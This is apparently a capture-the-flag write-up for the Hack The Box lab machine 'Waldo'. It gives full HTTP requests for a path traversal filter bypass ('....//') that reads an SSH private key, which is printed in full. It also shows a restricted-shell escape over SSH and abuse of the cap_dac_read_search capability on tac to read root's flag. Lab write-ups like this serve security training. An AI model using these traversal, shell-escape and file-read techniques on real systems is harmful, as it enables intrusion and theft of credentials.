149 - Waldo
===========

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS --top-ports 200 10.10.10.87
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-13 18:18 CEST
Nmap scan report for 10.10.10.87
Host is up (0.052s latency).
Not shown: 196 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8000/tcp open     http-alt
8888/tcp filtered sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 3.63 seconds
```

While using the site, several request seems to be interesting in Burp history, especially calls to:
- fileRead.php
- fileWrite.php
- dirRead.php

The dirRead.php can be abused to read the folder content as follows:
```
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Color: cyan
Connection: close

path=./
```

HTTP Response:
```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 15:39:54 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 155

[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

Now we can abuse the fileRead.php to read itself as follows:
```
POST /fileRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Color: cyan
Connection: close

file=./fileRead.php
```

HTTP Response:
```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 16:07:25 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 577

{"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
```

And here we see that the core filtering preventing us to do path traversal is simply replacing the strings `../` and `..\` by an empty string. This can be easily bypassed using `....//`that will be processed into `../` by the filter. Using this we can read the content of `/home/nobody/.ssh/` as follows:
```
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Color: cyan
Connection: close

path=....//....//....//home/nobody/.ssh/
```

HTTP Response:
```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 16:11:46 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 53

[".","..",".monitor","authorized_keys","known_hosts"]
```

And from this folder, we can read `authorized_keys`:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM\/VNgdz7ijwPfraXk3B\/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6\/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp\/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz\/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
```

And `.monitor`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```

Using this private key we can SSH on the host with the user `nobody` and get the user flag:
```bash
❯❯❯ ssh 10.10.10.87                                                                                          ⏎
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ cat user.txt 
32768bcd7513275e085fd4e7b63e9d24
```

## Privilege escalation
From our SSH shell we can connect again to localhost and get a different shell:
```bash
waldo:~$ ssh monitor@localhost -i .ssh/.monitor
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.                                                                  
          @@@,@@/ %                                                            
       #*/%@@@@/.&@@,                                                          
   @@@#@@#&@#&#&@@@,*%/                                                        
   /@@@&###########@@&*(*                                                      
 (@################%@@@@@.     /**                                             
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
 %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
 @@&%#########@@@@/                        */@@@%(((@@@%                       
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
                              %@@@@&(,,,,*(#&@@@@@@,     
                              
                            Here's Waldo, where's root?
Last login: Wed Aug 15 09:11:08 2018 from 127.0.0.1
-rbash: alias: command not found
```

But this is a restricted shell... however this is easily bypassed with:
```bash
waldo:~$ ssh monitor@localhost -i .ssh/.monitor -t bash --noprofile --norc
bash-4.4$
```

Now from here we can see that one folder is called `app-dev` and contains the source code of an executable called `logMonitor` when compiling and running it, the code does not work and return an error:
```bash
bash-4.4$ make clean
rm *.o *.gch logMonitor
bash-4.4$ make
gcc -Wall logMonitor.h
gcc -Wall -c logMonitor.c
gcc -Wall -o logMonitor logMonitor.o 
bash-4.4$ chmod u+x logMonitor
bash-4.4$ ./logMonitor -s
Cannot open file
```

However, runnin the executable located in the `v0.1` subfolder works:
```bash
bash-4.4$ v0.1/logMonitor-0.1 -s
Aug 15 10:33:13 waldo liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="403" x-info="http://www.rsyslog.com"] rsyslogd was HUPed
Aug 15 10:33:13 waldo liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="403" x-info="http://www.rsyslog.com"] rsyslogd was HUPed
[CUT CUT CUT]
```

After lots of googling, it appears that this is due to POSIX capabilities. The tool to check those is `getcap` and is not present on the box. We can however upload it through both SSH sessions and it works. I uploaded it to `/tmp/gc` and checked the capabilities of both logMonitor programs:
```bash
bash-4.4$ /tmp/gc logMonitor v0.1/logMonitor-0.1
v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

We see that the v0.1 has the `cap_dac_read_search` capability, the other has nothing (no result). From here, if we could exploit the binary it would be easy to read arbitrary files (the flag !). However, I couldn't do that. Instead, I used `getcap` to recusrsively check all capabilities on the filesystem as follows:
```bash
bash-4.4$ /tmp/gc -r / > /tmp/caps
[CUT CUT CUT]
bash-4.4$ cat /tmp/caps
./usr/bin/tac = cap_dac_read_search+ei
./home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

So we can apparently use the tac program with the same capability, let's use it to read the flag:
```bash
bash-4.4$ tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6c
```
